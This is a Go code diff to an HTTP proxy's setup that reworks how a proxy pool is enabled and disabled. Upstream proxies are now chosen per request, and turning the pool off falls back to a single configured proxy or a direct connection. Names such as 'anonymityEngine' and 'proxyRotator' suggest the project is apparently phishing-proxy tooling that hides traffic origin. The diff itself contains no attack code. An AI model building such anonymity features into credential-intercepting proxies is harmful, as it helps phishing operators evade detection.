@@ -191,7 +191,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
-		Handler:      p.Proxy,
+		Handler:      p,
 		ReadTimeout:  httpReadTimeout,
 		WriteTimeout: httpWriteTimeout,
 	}
@@ -366,44 +366,30 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		return nil, nil
 	}
 
-	// Register callback to auto-set single proxy when proxy pool is enabled
+	// Register callback to adjust transport when proxy pool is enabled/disabled
 	SetProxyPoolEnabledCallback(func(enabled bool) {
-		if enabled && p.anonymityEngine != nil && p.anonymityEngine.proxyRotator != nil {
-			// Get first working proxy from pool and set it as single proxy
-			proxy := p.anonymityEngine.proxyRotator.GetFirstWorkingProxy()
-			if proxy != nil {
-				proxyType := proxy.Type
-				if proxyType == "" {
-					proxyType = "socks5"
-				}
-				err := p.setProxy(true, proxyType, proxy.Host, proxy.Port, proxy.Username, proxy.Password)
-				if err != nil {
-					log.Error("[ProxyPool] Failed to auto-set single proxy: %v", err)
-				} else {
-					// Also update config for persistence
-					p.cfg.SetProxyType(proxyType)
-					p.cfg.SetProxyAddress(proxy.Host)
-					p.cfg.SetProxyPort(proxy.Port)
-					p.cfg.SetProxyUsername(proxy.Username)
-					p.cfg.SetProxyPassword(proxy.Password)
-					p.cfg.EnableProxy(true)
-					log.Success("[ProxyPool] Auto-configured single proxy from pool: %s://%s:%d", proxyType, proxy.Host, proxy.Port)
-					if proxy.Username != "" {
-						log.Info("[ProxyPool] Proxy authentication enabled (user: %s)", proxy.Username)
-					}
-				}
-			} else {
-				log.Warning("[ProxyPool] No working proxy found in pool to auto-configure")
+		if enabled {
+			// For pool-based per-request selection, ensure no global dialer is set
+			p.Proxy.Tr.Dial = nil
+			log.Success("[ProxyPool] Pool enabled. Using per-request proxy selection.")
+			return
+		}
+
+		// Pool disabled: revert to single proxy config if enabled, otherwise direct
+		if p.cfg.proxyConfig.Enabled {
+			proxyType := p.cfg.proxyConfig.Type
+			if proxyType == "" {
+				proxyType = "http"
 			}
-		} else if !enabled {
-			// Disable single proxy when pool is disabled - return to direct connection
-			err := p.setProxy(false, "", "", 0, "", "")
+			err := p.setProxy(true, proxyType, p.cfg.proxyConfig.Address, p.cfg.proxyConfig.Port, p.cfg.proxyConfig.Username, p.cfg.proxyConfig.Password)
 			if err != nil {
-				log.Warning("[ProxyPool] Failed to disable proxy: %v", err)
+				log.Warning("[ProxyPool] Failed to restore single proxy config: %v", err)
 			} else {
-				p.cfg.EnableProxy(false)
-				log.Info("[ProxyPool] Pool disabled - proxy disabled, using direct connection")
+				log.Info("[ProxyPool] Pool disabled. Reverted to single proxy configuration.")
 			}
+		} else {
+			p.Proxy.Tr.Dial = nil
+			log.Info("[ProxyPool] Pool disabled. Using direct connection.")
 		}
 	})
 
